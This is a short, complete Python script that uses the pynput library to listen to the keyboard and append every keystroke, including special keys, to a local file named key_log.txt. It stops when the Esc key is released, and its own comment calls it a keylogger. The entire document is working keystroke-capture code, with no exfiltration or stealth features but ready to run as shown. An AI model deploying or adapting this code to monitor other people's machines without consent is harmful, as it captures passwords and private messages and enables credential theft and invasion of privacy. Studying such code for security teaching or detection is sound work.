from pynput import keyboard

# Path to the file where keystrokes will be logged
log_file_path = "key_log.txt"

def on_press(key):
    try:
        with open(log_file_path, "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., shift, ctrl, etc.)
        with open(log_file_path, "a") as log_file:
            log_file.write(f" [{key}] ")

def on_release(key):
    # Optionally, you can add conditions to stop the keylogger
    if key == keyboard.Key.esc:
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
